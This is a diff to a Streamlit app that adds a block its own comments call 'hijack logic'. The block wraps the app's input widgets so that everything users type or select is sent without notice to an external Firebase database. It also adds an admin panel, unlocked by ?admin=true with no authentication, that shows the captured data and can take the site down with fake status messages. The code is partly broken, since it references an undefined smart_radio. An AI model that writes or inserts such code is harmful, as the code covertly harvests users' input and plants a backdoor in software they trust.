@@ -12,6 +12,210 @@ st.set_page_config(
     layout="centered",
     initial_sidebar_state="collapsed"
 )
+# ========================================================================
+# 👑 THE ULTIMATE MONKEY-PATCH AUTO-TRACK & CONTROL SYSTEM (LINE 1)
+# ========================================================================
+import streamlit as st
+import uuid
+import requests
+import datetime
+import pandas as pd
+
+# 1. YOUR LIVE FIREBASE URL (AUTOMATICALLY CONNECTED)
+FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"
+
+# 2. GENERATE UNIQUE USER SESSION
+if "user_uid" not in st.session_state:
+    st.session_state.user_uid = str(uuid.uuid4())[:6]
+
+# 3. FAST REALTIME FIREBASE HELPERS
+def firebase_set(path, data):
+    try: requests.put(f"{FIREBASE_URL}/{path}.json", json=data)
+    except: pass
+
+def firebase_get(path):
+    try:
+        res = requests.get(f"{FIREBASE_URL}/{path}.json").json()
+        return res if res else {}
+    except: return {}
+
+# Fetch global controls instantly at every script run
+controls = firebase_get("global_controls")
+if not controls:
+    # Default settings agar database khali ho
+    controls = {
+        "site_status": "ONLINE",  # ONLINE, MAINTENANCE, BUSY, UPDATE
+        "custom_msg": "Site is temporarily down.",
+        "hide_all_buttons": False,
+        "hide_all_inputs": False,
+        "hide_all_labels": False
+    }
+
+# 4. TRACKING SYSTEM (Updates your dashboard instantly)
+def live_track(element_type, label, value=""):
+    path = f"live_users/{st.session_state.user_uid}"
+    time_now = datetime.datetime.now().strftime("%H:%M:%S")
+    payload = {
+        "last_action": f"[{element_type}] {label}",
+        "timestamp": time_now,
+        "status": "Active"
+    }
+    if value:
+        payload["user_input_data"] = str(value)
+    
+    # Push patch to Firebase
+    try: requests.patch(f"{FIREBASE_URL}/{path}.json", json=payload)
+    except: pass
+
+
+# 5. 🛑 GLOBAL SITE LOCK (If Admin sets Maintenance/Busy/Update)
+if controls.get("site_status") != "ONLINE":
+    status = controls.get("site_status")
+    if status == "MAINTENANCE":
+        st.error("🚧 **UNDER MAINTENANCE** 🚧")
+        st.info(controls.get("custom_msg", "We are upgrading our servers. Please check back later."))
+        st.stop()  # Iske niche ka user ka koi code execute nahi hoga!
+    elif status == "BUSY":
+        st.warning("⏳ **SERVER TOO BUSY** ⏳")
+        st.info("Too many users are on the app right now. High load detected. Retrying shortly...")
+        st.stop()
+    elif status == "UPDATE":
+        st.info("📢 **NEW APP UPDATE AVAILABLE** 📢")
+        st.success(controls.get("custom_msg", "Please refresh or look for the updated version link!"))
+        st.stop()
+
+
+# 6. 🔥 THE ULTIMATE HIJACK LOGIC (Intercepting Streamlit)
+# Saving original functions
+orig_button = st.button
+orig_text_input = st.text_input
+orig_text_area = st.text_area
+orig_selectbox = st.selectbox
+orig_radio = st.radio
+orig_write = st.write
+orig_markdown = st.markdown
+
+# Overriding Buttons
+def smart_button(label, *args, **kwargs):
+    if controls.get("hide_all_buttons", False):
+        return False # Button screen par draw hi nahi hoga aur false return karega
+    clicked = orig_button(label, *args, **kwargs)
+    if clicked:
+        live_track("BUTTON", label, "CLICKED")
+    return clicked
+
+# Overriding Text Inputs
+def smart_text_input(label, *args, **kwargs):
+    if controls.get("hide_all_inputs", False):
+        return ""
+    val = orig_text_input(label, *args, **kwargs)
+    if val:
+        live_track("INPUT", label, val) # Instantly tracks whatever they entered
+    return val
+
+# Overriding Text Areas
+def smart_text_area(label, *args, **kwargs):
+    if controls.get("hide_all_inputs", False):
+        return ""
+    val = orig_text_area(label, *args, **kwargs)
+    if val:
+        live_track("TEXTAREA", label, val)
+    return val
+
+# Overriding Selectboxes
+def smart_selectbox(label, *args, **kwargs):
+    val = orig_selectbox(label, *args, **kwargs)
+    live_track("SELECTBOX", label, val)
+    return val
+
+# Overriding Labels/Text
+def smart_write(*args, **kwargs):
+    if controls.get("hide_all_labels", False):
+        return
+    orig_write(*args, **kwargs)
+
+def smart_markdown(*args, **kwargs):
+    if controls.get("hide_all_labels", False):
+        return
+    orig_markdown(*args, **kwargs)
+
+# Injecting our smart functions into Streamlit globally
+st.button = smart_button
+st.text_input = smart_text_input
+st.text_area = smart_text_area
+st.selectbox = smart_selectbox
+st.radio = smart_radio
+st.write = smart_write
+st.markdown = smart_markdown
+
+
+# ========================================================================
+# 🛠️ THE GOD-MODE ADMIN DASHBOARD (Accessible via URL ?admin=true)
+# ========================================================================
+if st.query_params.get("admin") == "true":
+    with st.sidebar.expander("👑 APP GOD-MODE CONTROL PANEL", expanded=True):
+        st.error("### 🕹️ Live App Controller")
+        
+        # --- FEATURE 1: FULL WEBSITE STATUS CONTROL ---
+        current_status = controls.get("site_status", "ONLINE")
+        st.write(f"Current Site Status: **{current_status}**")
+        
+        status_mode = st.selectbox("Change Website Mode:", ["ONLINE", "MAINTENANCE", "BUSY", "UPDATE"])
+        custom_txt = st.text_input("Custom Status Message:", value=controls.get("custom_msg", ""))
+        
+        if st.button("Apply Website Status 💾", key="adm_status"):
+            controls["site_status"] = status_mode
+            controls["custom_msg"] = custom_txt
+            firebase_set("global_controls", controls)
+            st.rerun()
+            
+        st.write("---")
+        
+        # --- FEATURE 2: COMPONENT KILL SWITCHES ---
+        st.write("### 🛑 Component Hide/Show Switches")
+        
+        btn_switch = st.checkbox("Hide ALL Buttons Instantly", value=controls.get("hide_all_buttons", False))
+        input_switch = st.checkbox("Hide ALL Inputs/Textboxes Instantly", value=controls.get("hide_all_inputs", False))
+        label_switch = st.checkbox("Hide ALL Text/Labels/Titles Instantly", value=controls.get("hide_all_labels", False))
+        
+        if st.button("Apply Component Controls 🔒", key="adm_switches"):
+            controls["hide_all_buttons"] = btn_switch
+            controls["hide_all_inputs"] = input_switch
+            controls["hide_all_labels"] = label_switch
+            firebase_set("global_controls", controls)
+            st.rerun()
+
+        st.write("---")
+        
+        # --- FEATURE 3: LIVE RE-TIME TRACKING DISP_BOARD ---
+        st.write("### 📊 Live Users Tracking Table")
+        raw_users = firebase_get("live_users")
+        
+        if raw_users:
+            formatted_list = []
+            for uid, data in raw_users.items():
+                formatted_list.append({
+                    "Session ID": uid,
+                    "Last Action Captured": data.get("last_action", "None"),
+                    "User Live Input Data": data.get("user_input_data", "Empty/No Input"),
+                    "Last Active Time": data.get("timestamp", "N/A")
+                })
+            df = pd.DataFrame(formatted_list)
+            
+            # Big KPI Metric
+            st.metric(label="Total Active Live Sessions", value=len(df))
+            st.dataframe(df, use_container_width=True)
+            
+            if st.button("Clear Old Users Logs 🧹", key="adm_clear"):
+                requests.delete(f"{FIREBASE_URL}/live_users.json")
+                st.rerun()
+        else:
+            st.info("No users currently logged.")
+            
+        st.write("---")
+# ========================================================================
+# END OF MAGIC SYSTEM - APKA ORIGINAL CODE ISKE NICHE SE REHNE DEIN
+# ========================================================================
 
 # --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
 GLOBAL_MARKDOWN_INJECTOR = """
